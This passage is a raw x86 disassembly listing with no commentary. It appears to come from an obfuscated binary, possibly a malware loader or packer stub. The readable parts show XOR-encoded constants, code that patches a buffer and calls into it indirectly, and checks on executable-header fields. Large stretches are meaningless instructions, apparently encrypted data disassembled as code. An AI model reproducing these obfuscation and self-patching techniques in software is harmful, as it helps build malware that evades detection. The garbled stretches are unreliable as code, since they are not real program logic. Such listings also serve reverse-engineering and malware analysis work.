  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x430556,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42ee30,0x430552
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ee10,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x4304a2,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x43054e,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x4304b2,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x4304b6,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0x6848db98,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a1ee
  40a236:	imul   edx,DWORD PTR [edi-0x46f95d77],0x56
  40a23d:	(bad)  
  40a23e:	jp     0x40a1d8
  40a240:	ja     0x40a27a
  40a242:	call   0xb1d0ee29
  40a247:	fnstcw WORD PTR [ecx]
  40a249:	(bad)  [ecx]
  40a24b:	push   edx
  40a24c:	push   esp
  40a24d:	into   
  40a24e:	stc    
  40a24f:	dec    edx
  40a250:	or     DWORD PTR [edx-0x58],0xca30eec1
  40a257:	sub    bl,BYTE PTR [esp+eax*8]
  40a25a:	lahf   
  40a25b:	jbe    0x40a1f7
  40a25d:	aad    0x2c
  40a25f:	shl    DWORD PTR [edx],cl
  40a261:	jg     0x40a258
  40a263:	dec    esi
  40a264:	cmp    ch,BYTE PTR [eax]
  40a266:	loopne 0x40a2e2
  40a268:	loop   0x40a235
  40a26a:	enter  0x28b8,0xab
  40a26e:	rol    BYTE PTR [ebx],cl
  40a270:	mov    edx,0x76e0b5ea
  40a275:	imul   esp,DWORD PTR [eax+0x2c62ca79],0x3610110b
  40a27f:	add    eax,0xaa9944af
  40a284:	or     cl,BYTE PTR [esi+edx*8-0xb40daba]
  40a28b:	mov    al,ds:0xf7d63ddd
  40a290:	sub    ecx,esp
  40a292:	les    ecx,FWORD PTR [ecx+0x3cb956c7]
  40a298:	icebp  
  40a299:	inc    eax
  40a29a:	or     eax,DWORD PTR [esi-0x2f42a83a]
  40a2a0:	xchg   DWORD PTR [eax-0x54],esi
  40a2a3:	cdq    
  40a2a4:	pop    eax
  40a2a5:	jp     0x40a2fd
  40a2a7:	cmp    al,0xc2
  40a2a9:	test   eax,0x1ee2ddd0
  40a2ae:	pop    ds
  40a2af:	pop    eax
  40a2b0:	or     esi,DWORD PTR [edi+0x9]
  40a2b3:	add    esp,DWORD PTR [esi+0x5c]
  40a2b6:	js     0x40a2c4
  40a2b8:	shl    BYTE PTR [ebp-0x6dbfe8df],1
  40a2be:	retf   0x9a71
  40a2c1:	mov    dh,0x1a
  40a2c3:	jae    0x40a2fe
  40a2c5:	push   ecx
  40a2c6:	lahf   
  40a2c7:	xchg   edx,eax
  40a2c8:	mov    al,0xb7
  40a2ca:	xlat   BYTE PTR ds:[ebx]
  40a2cb:	mov    WORD PTR [ebx+0x1631d8a8],?
  40a2d1:	pop    edi
  40a2d2:	inc    esp
  40a2d3:	retf   
  40a2d4:	dec    esi
  40a2d5:	xchg   BYTE PTR [edi+0x2c],ah
  40a2d8:	push   esi
  40a2d9:	mov    WORD PTR [ebx],es
  40a2db:	inc    esi
  40a2dc:	or     bl,BYTE PTR [eax]
  40a2de:	jbe    0x40a308
  40a2e0:	inc    ebp
  40a2e1:	mov    WORD PTR [ecx+0x79],cs
  40a2e4:	scas   eax,DWORD PTR es:[edi]
  40a2e5:	jbe    0x40a2f2
  40a2e7:	into   
  40a2e8:	xchg   ecx,eax
  40a2e9:	fs nop
  40a2eb:	fstp   TBYTE PTR es:[ecx+0x10]
  40a2ef:	sbb    eax,0x53cca0f4
  40a2f4:	addr16 retf 0x4c4d
  40a2f8:	mov    eax,0xff501ff6
  40a2fd:	mov    cl,0x57
  40a2ff:	adc    edi,DWORD PTR [edx]
  40a301:	call   0xf9571a4a
  40a306:	xchg   ebx,eax
  40a307:	pop    ecx
  40a308:	add    al,0xa5
  40a30a:	test   DWORD PTR [eax-0x44588d18],ebp
  40a310:	test   eax,0x4dc9017f
  40a315:	sub    bl,BYTE PTR [edi-0x3243366c]
  40a31b:	scas   al,BYTE PTR es:[edi]
  40a31c:	adc    BYTE PTR [ebp+0x1a],0x88
  40a320:	fidivr DWORD PTR [edi]
  40a322:	mov    dl,0x4c
  40a324:	mov    ?,WORD PTR [edi-0x572d59b6]
  40a32a:	cwde   
  40a32b:	sbb    al,0x29
  40a32d:	or     DWORD PTR [eax-0x3c00abbf],eax
  40a333:	pushf  
  40a334:	addr16 ret 
  40a336:	dec    ecx
  40a337:	add    DWORD PTR [edx*2+0x4a293ca7],ebp
  40a33e:	mul    BYTE PTR [edi+0x4dc256b1]
  40a344:	stc    
  40a345:	mov    cl,dl
  40a347:	sbb    edi,edx
  40a349:	xor    eax,0x8573b01
  40a34e:	rcr    ecx,0xdc
  40a351:	daa    
  40a352:	sbb    cl,BYTE PTR [eax]
  40a354:	js     0x40a364
  40a356:	mov    al,ds:0x25b4be13
  40a35b:	cmp    al,BYTE PTR [ebp+eax*1+0x79]
  40a35f:	jecxz  0x40a3c7
  40a361:	aas    
  40a362:	jb     0x40a34b
  40a364:	pop    edx
  40a365:	sahf   
  40a366:	movsx  eax,BYTE PTR [edi+0x2]
  40a36a:	xchg   DWORD PTR [eax+0x3852a56c],ecx
  40a370:	ins    DWORD PTR es:[edi],dx
  40a371:	mov    bl,0x24
  40a373:	scas   eax,DWORD PTR es:[edi]
  40a374:	lods   eax,DWORD PTR ds:[esi]
  40a375:	dec    ecx
  40a376:	dec    edi
  40a377:	mov    al,ds:0xb08b6315
  40a37c:	mov    edi,ecx
  40a37e:	and    bl,BYTE PTR [edi+0x20]
  40a381:	fidivr DWORD PTR [esi-0x2a097db3]
  40a387:	dec    esi
  40a388:	out    0xbc,al
  40a38a:	fistp  QWORD PTR [ebx]
  40a38c:	sti    
  40a38d:	loop   0x40a3ce
  40a38f:	push   esi
  40a390:	adc    al,0xaa
  40a392:	dec    ecx
  40a393:	repz (bad) [eax-0x23]
  40a397:	clc    
  40a398:	ins    BYTE PTR es:[edi],dx
  40a399:	jecxz  0x40a3e9
  40a39b:	mul    DWORD PTR [edx-0x551522f4]
  40a3a1:	jno    0x40a377
  40a3a3:	inc    eax
  40a3a4:	mov    ah,0x9
  40a3a6:	push   0x32c1233a
  40a3ab:	das    
  40a3ac:	dec    ecx
  40a3ad:	pmaddwd mm1,mm5
  40a3b0:	add    eax,0x8bf44b93
  40a3b5:	pop    ebx
  40a3b6:	mov    edi,esi
  40a3b8:	es jmp 0x1f5:0xab994f67
  40a3c0:	push   ds
  40a3c1:	fsubp  st(4),st
  40a3c3:	inc    edi
  40a3c4:	outs   dx,DWORD PTR ds:[esi]
  40a3c5:	mov    cl,0xc4
  40a3c7:	push   esi
  40a3c8:	das    
  40a3c9:	mov    ecx,0xc11f18e6
  40a3ce:	mov    cl,0x3
  40a3d0:	inc    esi
  40a3d1:	aad    0x43
  40a3d3:	loope  0x40a391
  40a3d5:	lock ja 0x40a424
  40a3d8:	jo     0x40a36a
  40a3da:	sbb    esi,0x68
  40a3dd:	jmp    0x2b07:0x542f4572
  40a3e4:	jb     0x40a37c
  40a3e6:	sahf   
  40a3e7:	pop    edx
  40a3e8:	outs   dx,DWORD PTR ds:[esi]
  40a3e9:	(bad)  
  40a3ea:	ror    BYTE PTR [edi-0x65b2e059],1
  40a3f0:	mov    ds:0x8e7360de,al
  40a3f5:	mov    bh,BYTE PTR [eax]
  40a3f7:	xchg   ecx,eax
  40a3f8:	mov    cl,0xd4
  40a3fa:	or     bl,BYTE PTR [eax+0x22]
  40a3fd:	and    BYTE PTR [ebx-0x3e0c6afe],al
  40a403:	test   DWORD PTR [ebp+edi*1+0x3f],edi
  40a407:	mov    bl,0x4d
  40a409:	idiv   BYTE PTR [ecx+eiz*8+0x3d10181a]
  40a410:	out    dx,eax
  40a411:	test   BYTE PTR [edx+0x5da45531],al
  40a417:	(bad)  
  40a418:	push   0xffffffe9
  40a41a:	loopne 0x40a491
  40a41c:	stos   BYTE PTR es:[edi],al
  40a41d:	enter  0x414f,0x66
  40a421:	sub    BYTE PTR [edx],al
  40a423:	int    0x57
  40a425:	inc    esi
  40a426:	(bad)
  40a429:	aas    
  40a42a:	ins    DWORD PTR es:[edi],dx
  40a42b:	(bad)  [ecx-0x36]
  40a42e:	xor    BYTE PTR [edx-0x511629d0],al
  40a434:	cmp    al,0x28
  40a436:	and    eax,0x187c28a1
  40a43b:	(bad)  
  40a43c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a43d:	out    0x48,eax
  40a43f:	addr16 adc eax,0x9f3fd577
  40a445:	rcr    BYTE PTR [edi],1
  40a447:	test   BYTE PTR ds:0xaafb5bea,cl
  40a44d:	(bad)  
  40a44e:	icebp  
  40a44f:	cmp    eax,0x3fd62927
  40a454:	sub    al,0x32
  40a456:	stos   BYTE PTR es:[edi],al
  40a457:	test   DWORD PTR [ebx+0x5137072e],0x56a8c3ed
  40a461:	(bad)  
  40a462:	or     eax,0xf6c83b98
  40a467:	adc    DWORD PTR [edi-0x75],esi
  40a46a:	mov    esp,0x720ea3f8
  40a46f:	dec    BYTE PTR [edi-0x47]
  40a472:	lock pop edi
  40a474:	dec    esp
  40a475:	jne    0x40a4bd
  40a477:	sbb    ebx,eax
  40a479:	in     eax,0x26
  40a47b:	pop    ebp
  40a47c:	in     eax,dx
  40a47d:	adc    eax,0x33671f5b
  40a482:	jmp    0xf6976172
  40a487:	out    0xbb,al
  40a489:	or     BYTE PTR [edx-0x62],ch
  40a48c:	fst    st(3)
  40a48e:	xchg   edx,eax
  40a48f:	cs mov ah,0xee
  40a492:	jge    0x40a4b4
  40a494:	call   0x5c7:0x8458bdb
  40a49b:	inc    edx
  40a49c:	add    eax,0x170043
  40a4a1:	add    BYTE PTR [eax],al
  40a4a3:	cmp    DWORD PTR ds:0x430542,0x0
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x430542,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42eae4
  40a4c6:	mov    ecx,DWORD PTR ds:0x430542
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x430542,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0x4043a360
  40a537:	mov    al,0x89
  40a539:	mov    ah,0xe8
  40a53b:	jle    0x40a5bb
  40a53d:	fbstp  TBYTE PTR [eax+0x7e]
  40a540:	jle    0x40a57f
  40a542:	sbb    eax,0xef9bc42d
  40a547:	jo     0x40a4ca
  40a549:	out    0xa1,al
  40a54b:	outs   dx,DWORD PTR ds:[esi]
  40a54c:	test   eax,0x3c4dd3d2
  40a551:	push   cs
  40a552:	sub    DWORD PTR [edx-0x557ac5a],eax
  40a558:	icebp  
  40a559:	mov    ds:0x364cac63,eax
  40a55e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a55f:	ins    BYTE PTR es:[edi],dx
  40a560:	sbb    DWORD PTR [eax],esp
  40a562:	xchg   ebx,eax
  40a563:	xchg   ecx,eax
  40a564:	xchg   ebx,eax
  40a565:	cs out 0x34,al
  40a568:	xor    ch,cl
  40a56a:	cld    
  40a56b:	nop
  40a56c:	adc    bl,BYTE PTR [esp+edx*1-0x7ae696e6]
  40a573:	iret   
  40a574:	mov    esi,esp
  40a576:	scas   al,BYTE PTR es:[edi]
  40a577:	sti    
  40a578:	lds    edi,FWORD PTR [eax+eax*8]
  40a57b:	adc    DWORD PTR ds:0x98b1d4dd,ecx
  40a581:	xchg   BYTE PTR [edi+0x3daf830],al
  40a587:	xor    DWORD PTR [esi+0x3e],0x75
  40a58b:	aad    0xcc
  40a58d:	nop
  40a58e:	das    
  40a58f:	and    al,0x4e
  40a591:	mov    ds:0x8c24c452,al
  40a596:	(bad)  
  40a597:	mov    dl,0x3a
  40a599:	in     al,dx
  40a59a:	shl    BYTE PTR [eax+0x7d184920],1
  40a5a0:	inc    esp
  40a5a1:	int    0xcb
  40a5a3:	pop    ebx
  40a5a4:	mov    cl,0xd
  40a5a6:	test   BYTE PTR ds:0x341b8606,al
  40a5ac:	lahf   
  40a5ad:	push   es
  40a5ae:	sbb    eax,0x971f7adc
  40a5b3:	sub    eax,0x8f5087e5
  40a5b8:	test   eax,0xd7903e9
  40a5bd:	adc    dl,BYTE PTR [edx]
  40a5bf:	shr    BYTE PTR ds:0x5ad766ba,cl
  40a5c5:	aaa    
  40a5c6:	inc    esi
  40a5c7:	imul   BYTE PTR [ebx]
  40a5c9:	outs   dx,DWORD PTR ds:[esi]
  40a5ca:	shl    DWORD PTR [edi+0x6d],1
  40a5cd:	or     al,0x2b
  40a5cf:	xchg   DWORD PTR [edx-0x3095c12c],ebx
  40a5d5:	aam    0xa
  40a5d7:	ror    DWORD PTR [edx-0x6f91c60],1
  40a5dd:	push   es
  40a5de:	mov    dh,0xc0
  40a5e0:	out    0x6a,eax
  40a5e2:	aaa    
  40a5e3:	int3   
  40a5e4:	jne    0x40a578
  40a5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5e7:	and    DWORD PTR [eax-0x2bbb98a5],esp
  40a5ed:	fisttp WORD PTR [eax-0x3e3376e9]
  40a5f3:	and    cl,bh
  40a5f5:	shl    BYTE PTR [eax-0x25],cl
  40a5f8:	cmp    bl,0xcd
  40a5fb:	dec    esp
  40a5fc:	cmp    edi,eax
  40a5fe:	sti    
  40a5ff:	repnz mov ds:0xb201a40b,eax
  40a605:	xchg   edi,eax
  40a606:	fmulp  st(6),st
  40a608:	idiv   DWORD PTR [ebp*8-0x4bf8ae88]
  40a60f:	div    DWORD PTR [edi+ebx*1+0x4b]
  40a613:	push   esp
  40a614:	clc    
  40a615:	pop    esi
  40a616:	pop    eax
  40a617:	jecxz  0x40a5b9
  40a619:	rol    DWORD PTR [ecx],0x74
  40a61c:	test   al,0x42
  40a61e:	jg     0x40a632
  40a620:	pop    es
  40a621:	push   ecx
  40a622:	in     al,0x5d
  40a624:	fwait
  40a625:	pop    esi
  40a626:	das    
  40a627:	ror    DWORD PTR [edx-0x1555bbe1],cl
  40a62d:	jo     0x40a5bd
  40a62f:	mov    ds:0x56ec4294,al
  40a634:	or     DWORD PTR [ecx-0x65a3f1b4],0xffffffd5
  40a63b:	mov    al,ds:0x76ba6e39
  40a640:	clc    
  40a641:	cdq    
  40a642:	ret    0xd829
  40a645:	les    esp,FWORD PTR [edx]
  40a647:	es out 0x61,eax
  40a64a:	dec    ebx
  40a64b:	es in  eax,0xd1
  40a64e:	or     DWORD PTR [edi+0x30],eax
  40a651:	xchg   edi,eax
  40a652:	adc    edi,DWORD PTR [eax+0x7fd82083]
  40a658:	sub    eax,0x1cc1ed9b
  40a65d:	adc    edi,DWORD PTR [ecx]
  40a65f:	jnp    0x40a68f
  40a661:	in     eax,dx
  40a662:	sbb    cl,al
  40a664:	adc    DWORD PTR [edx-0x33cdd729],edi
  40a66a:	and    al,0x49
  40a66c:	and    dl,BYTE PTR [ebp-0x39]
  40a66f:	data16 das 
  40a671:	arpl   WORD PTR [edx-0x5e],dx
  40a674:	adc    ebp,DWORD PTR [ecx-0x397e3803]
  40a67a:	call   0x2bbdda17
  40a67f:	mov    bh,0x2a
  40a681:	push   0xffffff96
  40a683:	adc    al,0xb7
  40a685:	sbb    al,0x5c
  40a687:	pop    es
  40a688:	inc    esp
  40a689:	pushf  
  40a68a:	dec    eax
  40a68b:	dec    ebp
  40a68c:	pop    es
  40a68d:	lods   al,BYTE PTR ds:[esi]
  40a68e:	shl    DWORD PTR [esi+0x12f83885],1
  40a694:	fild   QWORD PTR [ebx-0x6]
  40a697:	pop    ecx
  40a698:	cdq    
  40a699:	dec    ebx
  40a69a:	iret   
  40a69b:	js     0x40a6b2
  40a69d:	xchg   ecx,eax
  40a69e:	popa   
  40a69f:	jb     0x40a652
  40a6a1:	cs dec esi
  40a6a3:	vpsadbw xmm2,xmm7,xmm6
  40a6a7:	inc    esi
  40a6a8:	or     BYTE PTR [eax+0xbdf813d],dh
  40a6ae:	retf   
  40a6af:	es in  eax,0x6a
  40a6b2:	pop    edi
  40a6b3:	jl     0x40a6f5
  40a6b5:	push   0x41
  40a6b7:	loopne 0x40a6b1
  40a6b9:	sub    bh,BYTE PTR [edi]
  40a6bb:	ficomp WORD PTR [edx-0x59]
  40a6be:	pop    es
  40a6bf:	lahf   
  40a6c0:	aad    0xaf
  40a6c2:	push   eax
  40a6c3:	out    dx,eax
  40a6c4:	jo     0x40a646
  40a6c6:	ret    
  40a6c7:	bound  esi,QWORD PTR [edx]
  40a6c9:	pushf  
  40a6ca:	mov    ds:0xa197ec26,eax
  40a6cf:	into   
  40a6d0:	pop    ebp
  40a6d1:	aaa    
  40a6d2:	and    al,0x23
  40a6d4:	cld    
  40a6d5:	enter  0x89b3,0xc6
  40a6d9:	mov    ds:0x7596add2,eax
  40a6de:	push   esp
  40a6df:	xor    eax,0xadfc7fa3
  40a6e4:	ds aas 
  40a6e6:	mov    DWORD PTR [edi],edx
  40a6e8:	mov    ds:0x9e27f673,al
  40a6ed:	mov    ?,WORD PTR [edi]
  40a6ef:	jne    0x40a726
  40a6f1:	ins    DWORD PTR es:[edi],dx
  40a6f2:	pushf  
  40a6f3:	xor    eax,0x2e08ab5f
  40a6f8:	jmp    0x84d31bc3
  40a6fd:	call   0xf59ecdf9
  40a702:	mov    esp,DWORD PTR [ebx-0x4ea43d2a]
  40a708:	sub    DWORD PTR [ebx-0x46],esp
  40a70b:	mov    ebx,0x1d765b4e
  40a710:	sbb    ecx,DWORD PTR [ebx-0x51]
  40a713:	pop    ebp
  40a714:	jmp    0x40a763
  40a716:	mov    ecx,DWORD PTR [ecx]
  40a718:	imul   edi,eax,0x24
  40a71b:	popa   
  40a71c:	and    ebx,DWORD PTR [eax]
  40a71e:	ds in  al,dx
  40a720:	cmp    BYTE PTR [eax-0x2f],0xb7
  40a724:	adc    DWORD PTR [edi],ebp
  40a726:	jno    0x40a6be
  40a728:	int3   
  40a729:	int3   
  40a72a:	mov    esi,ebp
  40a72c:	pop    edi
  40a72d:	sbb    dh,BYTE PTR [ecx+eiz*8]
  40a730:	xor    ebp,DWORD PTR [edi]
  40a732:	nop
  40a733:	add    eax,0x36cedfa9
  40a738:	aad    0x2a
  40a73a:	sbb    BYTE PTR [edx],dl
  40a73c:	mov    esp,0x8147e5f6
  40a741:	and    BYTE PTR ds:0x8949f24f,cl
  40a747:	sub    bh,cl
  40a749:	leave  
  40a74a:	pop    ds
  40a74b:	(bad)  
  40a74c:	sub    esi,DWORD PTR [ecx+ebp*1]
  40a74f:	and    DWORD PTR [ebx+0x29f2ca6d],edx
  40a755:	hlt    
  40a756:	mov    cl,0x8d
  40a758:	pop    ds
  40a759:	and    eax,ebp
  40a75b:	and    eax,0x88ff495
  40a760:	cmp    edx,DWORD PTR [edi+0x6a]
  40a763:	cmp    ecx,DWORD PTR [esi-0x201e93ba]
  40a769:	pop    ss
  40a76a:	xsaveopt [eax]
  40a76d:	pop    ds
  40a76e:	sub    al,0x49
  40a770:	pop    ds
  40a771:	ret    
  40a772:	xchg   ebx,eax
  40a773:	data16 jbe 0x40a70a
  40a776:	dec    esp
  40a777:	jno    0x40a791
  40a779:	mov    ch,0x53
  40a77b:	pop    ss
  40a77c:	push   ebx
  40a77d:	xchg   ebp,eax
  40a77e:	push   ebx
  40a77f:	clc    
  40a780:	mov    edi,0x934cb6f5
  40a785:	das    
  40a786:	push   ss
  40a787:	call   0x9f62c159
  40a78c:	imul   eax,DWORD PTR [ebx+ebp*1+0x21f9cccc],0x5b
  40a794:	inc    esi
  40a795:	adc    dh,BYTE PTR [ecx]
  40a797:	inc    edx
  40a798:	add    DWORD PTR [esi+0x7d],ecx
  40a79b:	ins    BYTE PTR es:[edi],dx
  40a79c:	gs pop eax
  40a79e:	cli    
  40a79f:	and    BYTE PTR [ebx],al
  40a7a1:	inc    esi
  40a7a2:	add    eax,0x32729d
  40a7a7:	leave  
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43049e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43049e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43049e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43049e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43049e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ebd0
  40a7f1:	cmp    DWORD PTR ds:0x43049e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43049e
  40a803:	inc    eax
  40a804:	mov    ds:0x43049e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x4304d2
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x4304d6
